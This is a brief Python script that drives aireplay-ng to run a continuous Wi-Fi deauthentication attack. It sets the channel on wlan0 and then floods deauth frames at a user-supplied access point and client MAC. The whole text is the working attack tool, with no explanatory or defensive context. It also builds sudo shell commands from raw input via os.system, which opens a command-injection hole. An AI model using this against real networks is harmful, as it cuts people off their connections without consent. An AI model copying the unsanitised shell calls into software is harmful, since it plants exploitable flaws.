import os 
interface = "wlan0"
ent_ch = input("enter your network channel: ")
os.system(f"sudo iwconfig {interface} channel {ent_ch}")
try: 
  ap = input("ap: ")
  target_mac = input("mac: ")
  os.system(f"sudo aireplay-ng -0 0 -a {ap} {interface} -c {target_mac}")
except KeyboardInterrupt:
  print("exited")

